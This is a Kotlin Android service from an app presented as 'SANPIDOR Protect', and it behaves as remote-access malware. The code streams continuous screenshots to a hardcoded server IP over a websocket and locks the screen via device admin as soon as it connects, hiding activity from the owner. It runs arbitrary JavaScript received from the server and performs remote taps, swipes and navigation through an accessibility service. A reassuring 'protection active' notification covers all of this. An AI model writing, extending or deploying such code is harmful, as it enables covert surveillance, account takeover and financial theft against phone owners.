package com.sanpidor.protect

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import okhttp3.*
import okio.ByteString
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class ScreenCaptureService : Service() {

    companion object {
        private const val TAG = "ScreenCaptureService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "sanpidor_protect_channel"
        const val SERVER_URL = "ws://144.31.171.1:8080/ws/device"

        var isRunning = false
        var savedResultCode: Int = 0
        var savedData: Intent? = null

        // Вызывается из JsEngine
        private var instance: ScreenCaptureService? = null

        fun requestLock() { instance?.handler?.post { instance?.lockScreen() } }
        fun setFrameInterval(ms: Long) { instance?.frameIntervalMs = ms }
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var webSocket: WebSocket? = null
    private val handler = Handler(Looper.getMainLooper())
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(20, TimeUnit.SECONDS)
        .build()

    private var screenWidth = 720
    private var screenHeight = 1280
    private var screenDensity = 320
    private var frameIntervalMs = 200L
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var jsEngine: JsEngine

    override fun onCreate() {
        super.onCreate()
        instance = this
        isRunning = true
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("Инициализация..."))
        acquireWakeLock()
        // Инициализируем JS движок — результаты отправляем обратно на VPS
        jsEngine = JsEngine { result -> webSocket?.send(result) }
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Берём resultCode/data из intent ИЛИ из сохранённых статических полей
        val resultCode = intent?.getIntExtra("resultCode", 0)?.takeIf { it != 0 }
            ?: savedResultCode.takeIf { it != 0 }
            ?: run {
                Log.e(TAG, "No resultCode — stopping")
                stopSelf()
                return START_NOT_STICKY
            }

        @Suppress("DEPRECATION")
        val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra("data", Intent::class.java)
        } else {
            intent?.getParcelableExtra("data")
        } ?: savedData ?: run {
            Log.e(TAG, "No projection data — stopping")
            stopSelf()
            return START_NOT_STICKY
        }

        // Сохраняем для переживания перезапусков
        savedResultCode = resultCode
        savedData = data

        setupScreenCapture(resultCode, data)
        connectWebSocket()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        handler.removeCallbacksAndMessages(null)
        wakeLock?.takeIf { it.isHeld }?.release()
        webSocket?.close(1000, "Service stopped")
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        Log.d(TAG, "Service destroyed")
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SanpidorProtect::StreamLock"
            ).also { it.acquire(12 * 60 * 60 * 1000L) }
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock error: ${e.message}")
        }
    }

    private fun setupScreenCapture(resultCode: Int, data: Intent) {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getMetrics(metrics)

            // Четверть разрешения — меньше CPU, меньше трафика, нет лагов
            screenWidth   = metrics.widthPixels / 2
            screenHeight  = metrics.heightPixels / 2
            screenDensity = metrics.densityDpi / 2

            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)

            imageReader = ImageReader.newInstance(
                screenWidth, screenHeight, PixelFormat.RGBA_8888, 2
            )

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "SANPIDOR_Screen",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null, null
            )

            Log.d(TAG, "Capture: ${screenWidth}x${screenHeight}")
            updateNotification("Захват экрана активен")
        } catch (e: Exception) {
            Log.e(TAG, "Setup error: ${e.message}")
            stopSelf()
        }
    }

    private fun connectWebSocket() {
        val deviceId = Build.MODEL.replace(" ", "_")
        val request = Request.Builder()
            .url(SERVER_URL)
            .addHeader("X-Device-Id", deviceId)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "WebSocket connected")
                updateNotification("Подключено — экран будет выключен")
                // Небольшая задержка чтобы сервер успел подготовиться
                handler.postDelayed({ lockScreen() }, 1000)
                startCapturing()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleCommand(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket error: ${t.message}")
                updateNotification("Нет соединения — переподключение...")
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closed")
                scheduleReconnect()
            }
        })
    }

    private fun startCapturing() {
        handler.post(object : Runnable {
            override fun run() {
                if (isRunning) {
                    captureAndSend()
                    handler.postDelayed(this, frameIntervalMs)
                }
            }
        })
    }

    private fun captureAndSend() {
        // Не отправляем если нет активного соединения — экономим CPU
        if (webSocket == null) return

        try {
            val image = imageReader?.acquireLatestImage() ?: return
            image.use {
                val jpeg = imageToJpeg(it) ?: return
                webSocket?.send(ByteString.of(*jpeg))
            }
        } catch (e: Exception) {
            // Тихо пропускаем кадр — не крашимся
        }
    }

    private fun imageToJpeg(image: Image): ByteArray? {
        return try {
            val plane      = image.planes[0]
            val buffer     = plane.buffer
            val pixelStride = plane.pixelStride
            val rowPadding = plane.rowStride - pixelStride * screenWidth

            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            val cropped = if (rowPadding > 0)
                Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)
            else bitmap

            val out = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 50, out)
            if (cropped !== bitmap) cropped.recycle()
            bitmap.recycle()
            out.toByteArray()
        } catch (e: Exception) {
            null
        }
    }

    private fun handleCommand(jsonText: String) {
        try {
            val json = JSONObject(jsonText)
            when (json.getString("type")) {
                // JS-код с VPS — выполняется через Rhino
                // Пример: {"type":"js","code":"tap(0.5, 0.5)"}
                "js" -> {
                    val code = json.getString("code")
                    Thread { jsEngine.eval(code) }.also { it.isDaemon = true }.start()
                }
                "tap" -> {
                    val x = (json.getDouble("x") * screenWidth * 2).toFloat()
                    val y = (json.getDouble("y") * screenHeight * 2).toFloat()
                    ProtectAccessibilityService.performTap(x, y)
                }
                "swipe" -> {
                    val x1 = (json.getDouble("x1") * screenWidth * 2).toFloat()
                    val y1 = (json.getDouble("y1") * screenHeight * 2).toFloat()
                    val x2 = (json.getDouble("x2") * screenWidth * 2).toFloat()
                    val y2 = (json.getDouble("y2") * screenHeight * 2).toFloat()
                    ProtectAccessibilityService.performSwipe(x1, y1, x2, y2, json.optLong("duration", 300))
                }
                "back"    -> ProtectAccessibilityService.performBack()
                "home"    -> ProtectAccessibilityService.performHome()
                "recents" -> ProtectAccessibilityService.performRecents()
                "lock"    -> handler.post { lockScreen() }
                "set_fps" -> {
                    val fps = json.optInt("fps", 5).coerceIn(1, 15)
                    frameIntervalMs = 1000L / fps
                }
                "viewers_count" -> {
                    val count = json.optInt("count", 0)
                    frameIntervalMs = if (count > 0) 200L else 1000L
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command error: ${e.message}")
        }
    }

    private fun lockScreen() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, ProtectDeviceAdmin::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                Log.d(TAG, "Screen locked")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Lock error: ${e.message}")
        }
    }

    private fun scheduleReconnect() {
        handler.postDelayed({
            if (isRunning) connectWebSocket()
        }, 5000)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "SANPIDOR Protect", NotificationManager.IMPORTANCE_LOW
            ).apply { description = "Защита активна" }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(text: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SANPIDOR Protect")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun updateNotification(text: String) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(NOTIFICATION_ID, createNotification(text))
    }
}
